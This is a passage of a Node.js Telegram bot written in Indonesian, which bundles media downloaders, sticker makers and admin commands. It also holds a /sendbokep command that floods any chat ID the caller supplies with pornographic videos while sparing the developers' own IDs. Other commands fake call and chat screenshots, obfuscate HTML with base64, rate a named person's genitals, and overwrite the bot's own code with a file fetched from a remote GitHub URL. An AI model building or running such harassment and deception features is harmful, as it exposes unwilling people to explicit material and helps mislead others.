        await ctx.reply(`🗑️ <b>Admin Berhasil Dihapus</b>\n• User: <code>${userId}</code>`,
            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
    } else {
        await ctx.reply(`❌ <b>User bukan admin</b>\n• User: <code>${userId}</code>`,
            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
    }
});

bot.command("tiktok", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args)
    return ctx.replyWithMarkdown(
      "🎵 *Download TikTok*\n\nContoh: `/tiktok https://vt.tiktok.com/xxx`\n_Support tanpa watermark & audio_"
    );

  if (!args.match(/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i))
    return ctx.reply("❌ Format link TikTok tidak valid!");

  try {
    const processing = await ctx.reply("⏳ _Mengunduh video TikTok..._", { parse_mode: "Markdown" });

    const encodedParams = new URLSearchParams();
    encodedParams.set("url", args);
    encodedParams.set("hd", "1");

    const { data } = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "TikTokBot/1.0",
      },
      timeout: 30000,
    });

    if (!data.data?.play) throw new Error("URL video tidak ditemukan");

    await ctx.deleteMessage(processing.message_id);
    await ctx.replyWithVideo({ url: data.data.play }, {
      caption: `🎵 *${data.data.title || "Video TikTok"}*\n🔗 ${args}\n\n✅ Tanpa watermark`,
      parse_mode: "Markdown",
    });

    if (data.data.music) {
      await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
    }
  } catch (err) {
    console.error("[TIKTOK ERROR]", err.message);
    ctx.reply(`❌ Gagal mengunduh: ${err.message}`);
  }
});

function log(message, error) {
  if (error) {
    console.error(`[EncryptBot] ❌ ${message}`, error);
  } else {
    console.log(`[EncryptBot] ✅ ${message}`);
  }
}

bot.command("enchtml", async (ctx) => {
  if (!ctx.message.reply_to_message?.document) {
    return ctx.reply("❌ Please reply to a .html file you want to encrypt");
  }

  try {
    const fileId = ctx.message.reply_to_message.document.file_id;
    const fileInfo = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${tokenBot}/${fileInfo.file_path}`;

    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const htmlContent = Buffer.from(response.data).toString("utf8");

    const encoded = Buffer.from(htmlContent, "utf8").toString("base64");
    const encryptedHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>MoroseWave</title>
<script>
(function(){
  try { document.write(atob("${encoded}")); }
  catch(e){ console.error(e); }
})();
</script>
</head>
<body></body>
</html>`;

    const outputPath = path.join(__dirname, "enchtmlbymorosewave.html");
    fs.writeFileSync(outputPath, encryptedHTML, "utf-8");

    await ctx.replyWithDocument({ source: outputPath }, {
      caption: "✅ Enc Html By MoroseWave ( 🌊 )",
    });

    fs.unlinkSync(outputPath);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error saat membuat file terenkripsi.");
  }
});

const iqcSessions = {}
bot.command("iqc", async (ctx) => {
  const chatId = ctx.chat.id

  try {
    const args = ctx.message.text.split(" ").slice(1)

    if (args.length < 3) {
      return ctx.reply(
        "❌ Format : `/iqc 12:00 100 Your Message`",
        { parse_mode: "Markdown" }
      )
    }

    const time = args[0]
    const battery = args[1]
    const message = args.slice(2).join(" ")

    iqcSessions[chatId] = { time, battery, message }

    await ctx.reply("Pilih Provider", {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Axis", callback_data: "iqc_provider_Axis" },
            { text: "Telkomsel", callback_data: "iqc_provider_Telkomsel" }
          ],
          [
            { text: "IM3", callback_data: "iqc_provider_IM3" }
          ]
        ]
      }
    })
  } catch (err) {
    console.error("ERROR /iqc:", err)
    ctx.reply("Terjadi kesalahan.")
  }
})

bot.action(/^iqc_provider_/, async (ctx) => {
  const chatId = ctx.chat.id

  try {
    const provider = ctx.callbackQuery.data.replace("iqc_provider_", "")
    const data = iqcSessions[chatId]

    if (!data) {
      return ctx.answerCbQuery("Session habis, kirim ulang /iqc", {
        show_alert: true
      })
    }

    const { time, battery, message } = data

    await ctx.answerCbQuery("Diproses...")
    await ctx.reply("Sedang membuat gambar...")

    const apiUrl =
      "https://sockcode.zone.id/api/iqc" +
      `?t=${encodeURIComponent(time)}` +
      `&b=${encodeURIComponent(battery)}` +
      `&m=${encodeURIComponent(message)}` +
      `&p=${encodeURIComponent(provider)}`

    await ctx.replyWithPhoto(apiUrl, {
      caption: "✅ iqc By MoroseWave ( 🕷️ )",
      parse_mode: "Markdown"
    })

    delete iqcSessions[chatId]
  } catch (err) {
    console.error("ERROR callback:", err)
    ctx.reply("Gagal generate gambar.")
  }
})

bot.command("play", async (ctx) => {
   const text = ctx.message.text.split(" ").slice(1).join(" ")

   if (!text) {
      return ctx.reply("[$] Example: /play Payung Teduh")
   }

   try {
      await ctx.reply("⏳ Sedang mencari lagu di Spotify...")

      const { data } = await axios.get(`https://api.nexray.web.id/downloader/spotifyplay?q=${encodeURIComponent(text)}`)

      if (!data.status) {
         return ctx.reply("❌ Lagu tidak ditemukan!")
      }

      const res = data.result

      let caption = `❏ *SPOTIFY - PLAY* ❏

🏷 *Title:* ${res.title}
👤 *Artist:* ${res.artist}
🎧 *Album:* ${res.album}
⏳ *Duration:* ${res.duration}
🎬 *Popularity:* ${res.popularity}
🎉 *Release:* ${res.release_at}
📎 *URL:* ${res.url}`

      await ctx.replyWithPhoto(
         { url: res.thumbnail },
         { caption: caption, parse_mode: "Markdown" }
      )

      await ctx.replyWithAudio(
         { url: res.download_url },
         {
            title: res.title,
            performer: res.artist
         }
      )

   } catch (err) {
      console.log(err)
      ctx.reply("❌ Terjadi kesalahan saat mengambil data.")
   }
});

bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

bot.command('mediafire', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (!args.length) return ctx.reply('Gunakan: /mediafire <url>');

    try {
      const { data } = await axios.get(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(args[0])}`);
      const { title, url } = data.data;

      const filePath = `/tmp/${title}`;
      const response = await axios.get(url, { responseType: 'arraybuffer' });
      fs.writeFileSync(filePath, response.data);

      const zip = new AdmZip();
      zip.addLocalFile(filePath);
      const zipPath = filePath + '.zip';
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({ source: zipPath }, {
        filename: path.basename(zipPath),
        caption: '📦 File berhasil di-zip dari MediaFire'
      });

      
      fs.unlinkSync(filePath);
      fs.unlinkSync(zipPath);

    } catch (err) {
      console.error('[MEDIAFIRE ERROR]', err);
      ctx.reply('Terjadi kesalahan saat membuat ZIP.');
    }
  });

bot.command("fixcode", async (ctx) => {
  try {
    const fileMessage = ctx.message.reply_to_message?.document || ctx.message.document;

    if (!fileMessage) {
      return ctx.reply(`📂 Kirim file .js dan reply dengan perintah /fixcode`);
    }

    const fileName = fileMessage.file_name || "unknown.js";
    if (!fileName.endsWith(".js")) {
      return ctx.reply("⚠️ File harus berformat .js bre!");
    }

    const fileUrl = await ctx.telegram.getFileLink(fileMessage.file_id);
    const response = await axios.get(fileUrl.href, { responseType: "arraybuffer" });
    const fileContent = response.data.toString("utf-8");

    await ctx.reply("🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");

    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return ctx.reply("❌ Gagal memperbaiki kode, coba ulang bre.");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${fileName}`;
    fs.writeFileSync(outputPath, fixedCode);

    await ctx.replyWithDocument({ source: outputPath, filename: `fixed_${fileName}` });
  } catch (err) {
    console.error("FixCode Error:", err);
    ctx.reply("⚠️ Terjadi kesalahan waktu memperbaiki kode.");
  }
});

const tiktokCache = new Map();

bot.command("tiktoksearch", async (ctx) => {
    const userId = ctx.from.id;

    try {
        const text = ctx.message.text.split(" ").slice(1).join(" ").trim();

        if (!text) {
            return ctx.reply(
                "🪧 Masukkan kata kunci!\nContoh: `/tiktoksearch epep`",
                { parse_mode: "Markdown", reply_to_message_id: ctx.message.message_id }
            );
        }

        const loadingMsg = await ctx.reply("⏳ SEARCHING VIDEO TIKTOK...");

        const searchUrl =
            `https://www.tikwm.com/api/feed/search?keywords=${encodeURIComponent(text)}&count=5`;

        const res = await axios.get(searchUrl, { timeout: 20000 });
        const data = res.data;

        const videos =
            data?.data?.videos ||
            data?.data?.list ||
            data?.data?.aweme_list ||
            data?.data ||
            [];

        if (!Array.isArray(videos) || videos.length === 0) {
            await ctx.deleteMessage(loadingMsg.message_id).catch(() => {});
            return ctx.reply("⚠️ Tidak ada hasil ditemukan.");
        }

        const topVideos = videos.slice(0, 5);
        const uniqueKey = Math.random().toString(36).slice(2, 10);

        tiktokCache.set(uniqueKey, {
            data: topVideos,
            expire: Date.now() + (10 * 60 * 1000)
        });

        await ctx.deleteMessage(loadingMsg.message_id).catch(() => {});

        const { Markup } = require('telegraf');
        const buttons = topVideos.map((v, i) =>
            [Markup.button.callback(
                `${i + 1}. ${(v.title || "Tanpa Judul").slice(0, 30)}`,
                `tt_${uniqueKey}_${i}_${userId}`
            )]
        );

        await ctx.reply(
            `📌 Ditemukan ${topVideos.length} hasil untuk:\n${text}\n\nPilih video:`,
            Markup.inlineKeyboard(buttons)
        );

    } catch (err) {
        console.error("❌ TikTok Search Error:", err.message);
        ctx.reply("⚠️ Gagal mengambil hasil pencarian TikTok.");
    }
});

bot.action(/tt_(.+)/, async (ctx) => {
    try {
        const data = ctx.match[1];
        const [cacheKey, index, userId] = data.split("_");

        if (ctx.from.id != userId) {
            return ctx.answerCbQuery("⚠️ Ini bukan tombol kamu!", { show_alert: true });
        }

        const cachedObj = tiktokCache.get(cacheKey);
        if (!cachedObj) {
            return ctx.answerCbQuery("⚠️ Cache expired!", { show_alert: true });
        }

        const v = cachedObj.data[index];
        if (!v) {
            return ctx.answerCbQuery("⚠️ Data tidak valid!", { show_alert: true });
        }

        await ctx.answerCbQuery();

        await ctx.deleteMessage().catch(() => {});
        await ctx.reply("⏳ MENGUNDUH VIDEO...");

        const author =
            v.author?.unique_id ||
            v.author?.nickname ||
            v.user?.unique_id ||
            "unknown";

        const videoId =
            v.video_id ||
            v.id ||
            v.aweme_id ||
            v.short_id ||
            v.video?.id;

        if (!videoId) {
            return ctx.reply("⚠️ ID video tidak valid.");
        }

        const tiktokUrl = `https://www.tiktok.com/@${author}/video/${videoId}`;

        const res = await axios.post(
            "https://www.tikwm.com/api/",
            `url=${encodeURIComponent(tiktokUrl)}`,
            {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                timeout: 30000
            }
        );

        const result = res.data;

        if (!result || result.code !== 0 || !result.data) {
            throw new Error("Video tidak valid");
        }

        const vid = result.data;

        const videoUrl =
            vid.play ||
            vid.hdplay ||
            vid.wmplay ||
            vid.play_addr;

        if (!videoUrl) {
            return ctx.reply("⚠️ Link video tidak ditemukan.");
        }

        const caption =
`☀ MoroseWave Searching  
Video : *${(vid.title || "Video TikTok").slice(0, 80)}*  
Author : @${vid.author?.unique_id || "unknown"}  
Likes : ${vid.digg_count || 0}  
Comment : ${vid.comment_count || 0}  
[🌐 Lihat di TikTok](${tiktokUrl})`;

        try {
            await ctx.replyWithVideo(videoUrl, {
                caption,
                parse_mode: "Markdown"
            });
        } catch {
            const video = await axios.get(videoUrl, {
                responseType: "arraybuffer",
                timeout: 30000
            });

            await ctx.replyWithVideo(
                { source: Buffer.from(video.data) },
                {
                    caption,
                    parse_mode: "Markdown"
                }
            );
        }

        tiktokCache.delete(cacheKey);

    } catch (err) {
        console.error("❌ Callback Error:", err.message);
    }
});

bot.command("cekidgroup", async (ctx) => {
  const chatId = ctx.chat.id;

  try {
    // Cek koneksi WhatsApp
    if (sessions.size === 0) {
      return ctx.reply("❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    // Ambil semua grup yang diikuti oleh bot
    const groups = await sock.groupFetchAllParticipating();
    const groupEntries = Object.values(groups);

    if (groupEntries.length === 0) {
      return ctx.reply("❌ Bot belum join grup mana pun");
    }

    // Buat daftar grup dengan format HTML
    let text = `<b>📋 DAFTAR ID GRUP WHATSAPP</b>\n\n`;
    let no = 1;
    for (const group of groupEntries) {
      text +=
        `<b>${no}.</b> ${group.subject}\n` +
        `ID: <code>${group.id}</code>\n\n`;
      no++;
    }

    // Kirim pesan dengan HTML
    await ctx.reply(text, { parse_mode: "HTML" });
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Gagal mengambil data grup");
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Example\n/brat Reo Del Rey", { parse_mode: "Markdown" });

  try {
    await ctx.reply(" Membuat stiker...");

    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    const filePath = path.join(__dirname, "brat.webp");
    fs.writeFileSync(filePath, response.data);

    await ctx.replyWithSticker({ source: filePath });

    fs.unlinkSync(filePath);

  } catch (err) {
    console.error("Error brat:", err.message);
    ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
  }
});

bot.command("cekkhodam", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" ");

    if (!text) {
        return ctx.reply("Nama nya mana yang mau di cek khodam nya");
    }

    function pickRandom(list) {
        return list[Math.floor(Math.random() * list.length)];
    }

    const hasil = `
╭━━━━°「 *Khodam ${text}* 」°
┃
┊• Nama : ${text}
┊• Khodam : ${pickRandom([
            'Macan Tutul', 'Gajah Sumatera', 'Orangutan', 'Harimau Putih', 'Badak Jawa',
            'Pocong', 'Kuntilanak', 'Genderuwo', 'Wewe Gombel', 'Kuyang', 'Lembuswana',
            'Anoa', 'Komodo', 'Elang Jawa', 'Burung Cendrawasih', 'Tuyul', 'Babi Ngepet',
            'Sundel Bolong', 'Jenglot', 'Lele Sangkuriang', 'Kucing Hutan', 'Ayam Cemani',
            'Cicak', 'Burung Merak', 'Kuda Lumping', 'Buaya Muara', 'Banteng Jawa',
            'Monyet Ekor Panjang', 'Tarsius', 'Cenderawasih Biru', 'Gyzen Palembang',
            'Kolor Ijo', 'Palasik', 'Nyi Roro Kidul', 'Siluman Ular', 'Kelabang',
            'Beruang Madu', 'Serigala', 'Hiu Karang', 'Rajawali', 'Lutung Kasarung',
            'Kuda Sumba', 'Ikan Arwana', 'Jalak Bali', 'Kambing Etawa', 'Kelelawar',
            'Burung Hantu', 'Ikan Cupang'
        ])}
┊• Mendampingi dari : ${pickRandom([
            '1 tahun lalu', '2 tahun lalu', '3 tahun lalu', '4 tahun lalu', 'dari lahir'
        ])}
┃• Expired : ${pickRandom([
            '2024', '2025', '2026', '2027', '2028', '2029', '2030', '2031', '2032', '2033', '2034', '2035'
        ])}
╰═┅═━––––––๑`;

    ctx.reply(hasil);
});

bot.command("cekkontol", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" ");

    if (!text) {
        return ctx.reply("Nama nya mana yang mau di cek kontol nya");
    }

    function pickRandom(list) {
        return list[Math.floor(Math.random() * list.length)];
    }

    const hasil = `
╭━━━━°「 *Kontol ${text}* 」°
┃
┊• Nama : ${text}
┊• Kontol : ${pickRandom(['ih item', 'Belang wkwk', 'Muluss', 'Putih Mulus', 'Black Doff', 'Pink wow', 'Item Glossy'])}
┊• True : ${pickRandom(['perjaka', 'ga perjaka', 'udah pernah dimasukin', 'masih ori', 'jumbo'])}
┊• jembut : ${pickRandom(['lebat', 'ada sedikit', 'gada jembut', 'tipis', 'muluss'])}
┊• ukuran : ${pickRandom(['1cm', '2cm', '3cm', '4cm', '5cm', '20cm', '45cm', '50cm', '90meter', '150meter', '5km', 'gak normal'])}
╰═┅═━––––––๑`;

    ctx.reply(hasil);
});

bot.command("tourl", async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /tourl ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("🕑 Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

// ======================
// AUTO UPDATE SYSTEM
// ======================
const UPDATE_URL = "https://raw.githubusercontent.com/Danz-code887/supbuntut/refs/heads/main/index.js";
const UPDATE_FILE_PATH = "./index.js"; 

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https
      .get(url, (res) => {
        if (res.statusCode !== 200) {
          file.close(() => fs.unlink(filePath, () => {}));
          return reject(new Error(`HTTP_${res.statusCode}`));
        }

        res.pipe(file);

        file.on("finish", () => file.close(resolve));
      })
      .on("error", (err) => {
        file.close(() => fs.unlink(filePath, () => {}));
        reject(err);
      });
  });
}

// ======================
// ACTION UPDATE (LANGSUNG DARI TOMBOL)
// ======================
bot.action('update_now', async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ Akses hanya untuk pemilik");
  }

  await ctx.editMessageCaption(`
<pre><code class="language-javascript">
⏳ Auto Update Script...
Mohon tunggu.
</code></pre>`, { parse_mode: "HTML" });

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    await ctx.editMessageCaption(`
<pre><code class="language-javascript">
✅ Update berhasil!
♻ Restarting bot...
</code></pre>`, { parse_mode: "HTML" });

    setTimeout(() => process.exit(0), 1500);
  } catch (e) {
    await ctx.editMessageCaption(`
<pre><code class="language-javascript">
❌ Gagal update.
Reason: ${String(e.message || e)}
</code></pre>`, { parse_mode: "HTML" });
  }
});



bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command("blockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /blockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock)
      db.groupCmdBlock = {};

    if (!db.groupCmdBlock[groupId])
      db.groupCmdBlock[groupId] = [];

    if (db.groupCmdBlock[groupId].includes(cmd)) {
      return ctx.reply("⚠️ Command sudah diblock.");
    }

    db.groupCmdBlock[groupId].push(cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil block command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("unblockcmd", checkAdmin, async (ctx) => {
  try {
    if (ctx.chat.type === "private")
      return ctx.reply("❌ Command ini hanya untuk grup.");

    const args = ctx.message.text.split(" ").slice(1);

    if (!args[0])
      return ctx.reply("Example : /unblockcmd /menu");

    const cmd = args[0].toLowerCase();

    const db = loadDB();
    const groupId = String(ctx.chat.id);

    if (!db.groupCmdBlock?.[groupId]) {
      return ctx.reply("⚠️ Tidak ada command yang diblock.");
    }

    db.groupCmdBlock[groupId] =
      db.groupCmdBlock[groupId].filter(c => c !== cmd);

    saveDB(db);

    ctx.reply(`✅ Berhasil unblock command ${cmd}`);
  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

bot.command("listblockcmd", async (ctx) => {
  try {
    const db = loadDB();
    const chatId = String(ctx.chat.id);

    const blocked =
      db.groupCmdBlock?.[chatId] || [];

    if (blocked.length < 1) {
      return ctx.reply(
        "❌ Tidak ada command yang diblock."
      );
    }

    let teks = `📌 LIST BLOCK COMMAND\n\n`;

    blocked.forEach((cmd, i) => {
      teks += `${i + 1}. ${cmd}\n`;
    });

    ctx.reply(teks);

  } catch (err) {
    console.log(err);
    ctx.reply("Terjadi error.");
  }
});

const PREM_GROUP_FILE = "./grup.json";

function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

bot.command("addpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

 
  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /addpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
 
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = addPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} sudah terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil ditambahkan ke daftar grup premium.`);
});

bot.command("delpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /delpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = delPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} belum terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil dihapus dari daftar grup premium.`);
});

const PROTECTED_IDS = new Set([
  "1550001633",
  "8035037851",
]);

const videoList = [
  "https://files.catbox.moe/kusho1.jpg",
  "https://files.catbox.moe/85mjwm.mp4",
  "https://files.catbox.moe/fzzhjm.jpg",
  "https://files.catbox.moe/ec28m8.mp4",
  "https://files.catbox.moe/n3ebuz.mp4",
  "https://files.catbox.moe/qhr4fl.jpg",
  "https://files.catbox.moe/zqaszb.mp4",
  "https://files.catbox.moe/34aa39.mp4",
  "https://files.catbox.moe/dmbizk.mp4",
  "https://files.catbox.moe/wmda7z.mp4",
  "https://files.catbox.moe/kwb2m2.jpg",
  "https://files.catbox.moe/8xye1k.jpg",
  "https://files.catbox.moe/y1osro.mp4",
  "https://files.catbox.moe/2mowo7.jpg",
  "https://files.catbox.moe/o1ipxw.mp4",
  "https://files.catbox.moe/i6335n.mp4",
  "https://files.catbox.moe/73rjgf.jpg",
  "https://files.catbox.moe/3re1pn.jpg",
  "https://files.catbox.moe/sclrvo.jpg",
  "https://files.catbox.moe/l3sra9.jpg",
  "https://files.catbox.moe/vxe9zl.mp4",
  "https://files.catbox.moe/9vtw1i.jpg",
  "https://files.catbox.moe/o1sq2k.mp4",
  "https://files.catbox.moe/y91pkz.jpg",
  "https://files.catbox.moe/0hies4.jpg",
  "https://files.catbox.moe/hnbks1.jpg",
  "https://files.catbox.moe/1a78ht.mp4",
  "https://files.catbox.moe/htcdyl.jpg",
  "https://files.catbox.moe/iajl3r.mp4",
  "https://files.catbox.moe/pamcr7.jpg",
  "https://files.catbox.moe/eti8qi.mp4",
  "https://files.catbox.moe/wgj8vl.mp4",
  "https://files.catbox.moe/83fd5h.mp4",
  "https://files.catbox.moe/k1w8sw.jpg",
  "https://files.catbox.moe/tdqof8.jpg",
  "https://files.catbox.moe/6di4hn.mp4",
  "https://files.catbox.moe/0eisok.mp4",
  "https://files.catbox.moe/e5zkcl.jpg",
];

bot.command("sendbokep", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);

  const targetId = args[0];
  const jumlah = parseInt(args[1]) || 1;

  if (!targetId) {
    return ctx.reply("❌ Format: /sendbokep <chat_id> [jumlah]");
  }

  if (PROTECTED_IDS.has(String(targetId))) {
    return ctx.replyWithHTML(
  `⛔ Pengiriman diblokir: ID <code>${targetId}</code> termasuk dalam daftar terlindungi (developer).`
  );
  }
  
  await ctx.replyWithHTML(
  `Mengirim ${jumlah} video ke ID: <code>${targetId}</code>`
  );

  for (let i = 0; i < jumlah; i++) {
    const randomVideo =
      videoList[Math.floor(Math.random() * videoList.length)];

    try {
      await ctx.telegram.sendVideo(targetId, randomVideo);
    } catch (err) {
      console.error("Gagal kirim video:", err.message);

      return ctx.replyWithHTML(
  `❌ Gagal mengirim video ke ID <code>${targetId}</code>: ${err.message}`
  );
    }
  }

  await ctx.replyWithHTML(
    `✅ Berhasil mengirim ${jumlah} video ke ID: <code>${targetId}</code>`
  );
});

const activePolls = {};

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id)) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    if (ctx.message.reply_to_message) {
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
